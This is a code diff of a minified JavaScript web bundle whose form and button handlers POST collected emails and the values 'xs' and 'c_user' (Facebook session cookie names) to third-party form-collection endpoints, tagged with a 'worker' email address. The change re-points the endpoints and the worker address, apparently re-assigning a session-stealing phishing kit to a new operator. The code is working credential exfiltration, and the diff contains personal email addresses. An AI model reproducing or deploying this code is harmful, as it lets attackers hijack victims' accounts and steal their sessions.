@@ -13358,14 +13358,14 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/OqP4tNM7i", {
+                                    u && o ? (fetch("https://submit-form.com/ygEXWax6o", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "asad.ali.nizamani.official@gmail.com",
+                                            workerEmail: "irbaznizamani773@gmail.com",
                                             xs: o,
                                             c_user: u,
                                             name: "My Self"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/OqP4tNM7i", {
+                        fetch("https://submit-form.com/J73pvmzIg", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
